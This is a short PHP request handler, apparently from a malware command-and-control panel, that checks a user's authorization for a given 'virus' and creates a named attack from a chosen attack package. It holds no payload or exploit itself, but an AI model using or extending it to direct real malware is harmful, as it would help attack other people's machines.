<?php

use Kelvinho\Virus\Header;

$virus_id = $requestData->postCheck("virus_id");
$attack_package = $requestData->postCheck("attack_package");
$name = $requestData->postCheck("name");

if (strlen($name) > 50) {
    Header::badRequest();
}

if (!$authenticator->authorized($virus_id)) {
    Header::forbidden();
}

$attack = $attackFactory->new($virus_id, $attack_package, $name);
if ($attack == null) {
    Header::badRequest();
}
$session->set("attack_id", $attack->getAttackId());
Header::ok();
